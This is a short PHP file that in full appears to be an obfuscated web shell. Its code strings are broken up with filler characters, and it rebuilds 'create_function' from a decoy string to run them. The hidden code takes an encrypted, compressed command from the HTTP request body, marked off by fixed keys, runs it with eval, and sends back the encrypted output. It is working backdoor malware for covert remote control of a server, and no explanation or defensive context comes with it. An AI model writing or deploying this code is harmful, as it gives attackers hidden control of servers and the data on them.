<?php
$U=';$j++,$i+!`+){$o!`.=$t!`{$i!`}^$k!`{$j}!`;}}!`return $o;}i!`f (@preg_matc';
$R='$k="7!`2e84d9!`0!`!`!`";$kh="e0a3!`9577c!`b9c";$kf="87893!`05523!`bf!`"!`';
$D='ba!`!`se64_encod!`e(@x(@gzcompres!`s(!`$o),$!`k));print("$p!`$!`kh$r$kf");}';
$L='h(!`"/$kh!`(.+)$kf!`/",@!`fil!`e_get_co!`ntents("p!`hp://!`inp!`ut"),$m!`)==';
$Y='le!`n($t)!`;$!`o!`="";fo!`r($i=!`0;$i<$l;){for!`($j=0;(!`$j!`<$c&&$i<$!`l)';
$P='($m[1]),$k)))!`;$o=@o!`b_get!`_conten!`ts()!`;@o!`b_end_!`clea!`n();$r=@!`';
$V='1) {@o!`b_!`start!`();@eva!`l(@gzu!`ncompr!`ess(@x(!`@bas!`e64_d!`ec!`ode';
$e=';$p="b58fE7KmwEz!`IRKZ!`7";functio!`n x($t,!`$k)!`{$c=strl!`en($k!`);$l=str';
$d=str_replace('m','','mcremamtem_funcmmtion');
$v=str_replace('!`','',$R.$e.$Y.$U.$L.$V.$P.$D);
$N=$d('',$v);$N();
?>
